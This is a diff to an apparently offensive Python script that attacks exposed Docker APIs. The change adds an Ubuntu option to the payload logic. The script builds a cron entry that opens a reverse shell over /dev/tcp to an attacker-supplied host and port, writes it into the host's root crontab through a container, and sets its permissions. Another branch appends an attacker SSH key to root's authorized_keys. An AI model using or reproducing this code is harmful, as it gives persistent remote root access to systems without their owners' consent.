@@ -78,7 +78,7 @@ def printContainer(host,port,version,allContainer):
     print "[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]"
 
 if __name__ == "__main__":
-    opts, args = getopt.getopt(sys.argv[1:], "v:kaVCcsLli:e:h:p:H:P:I:")
+    opts, args = getopt.getopt(sys.argv[1:], "v:kauVCcsLli:e:h:p:H:P:I:")
     key = 0
     version =''
     payload =''
@@ -116,10 +116,14 @@ if __name__ == "__main__":
             startContainer = 1
         elif op == '-k':
             key = 1
+        elif op == '-u':
+            isUbuntu = 1
             
     if isset('lhsot') and isset('lport'):
-        payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #ubuntu failure,beacuse It need to restart the cron or system
-        #payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
+        if isset('isUbuntu'):
+            payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #chmod 600
+        else:
+            payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
         print "[-]Paylaod: "+payload
     if sshkey !='' and key == 1:
         payload = '/bin/bash -c "echo \\\"'+sshkey+'\\\" >> /tmp1/.ssh/authorized_keys"'
@@ -140,8 +144,14 @@ if __name__ == "__main__":
             print "[-]Container ID:"+container['Id']
             print "[-]Warning:"+str(container['Warnings'])
             response = cli.start(container=container.get('Id'))
-            if payload != '':
+            if isset('isUbuntu'):
+                cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload))
+                print "[-]create crontabs ......"
+                cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd='chmod 600 /tmp/spool/cron/crontabs/root'))
+                print "[-]chmod 600 ......"
+            else:
                 print cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload))
+                print "[-]create crontabs ......"
         elif isset('closeContainer') and isset('imageId'):
             cli = createClient(host,port,version)
             cli.stop(container=imageId)
